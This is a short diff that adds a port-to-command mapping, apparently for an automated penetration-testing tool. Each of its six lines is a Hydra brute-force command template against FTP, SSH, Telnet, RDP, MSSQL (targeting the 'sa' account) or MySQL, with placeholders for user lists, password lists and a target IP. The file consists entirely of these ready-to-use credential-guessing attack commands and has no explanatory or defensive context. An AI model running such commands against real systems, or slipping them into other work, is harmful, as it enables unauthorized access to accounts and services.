@@ -1,0 +1,6 @@
+21:hydra -t 10 -V -f -L [users] -P [passwords] ftp://[ipAddress]
+22:hydra -t 10 -V -f -L [users] -P [passwords] ssh://[ipAddress]
+23:hydra -t 10 -V -f -L [users] -P [passwords] telnet://[ipAddress]
+3389:hydra -t 10 -V -f -L [users] -P [passwords] rdp://[ipAddress]
+1433:hydra -t 10 -V -f -l sa -P [passwords] mssql://[ipAddress]
+3306:hydra -t 10 -V -f -L [users] -P [passwords] mysql://[ipAddress]
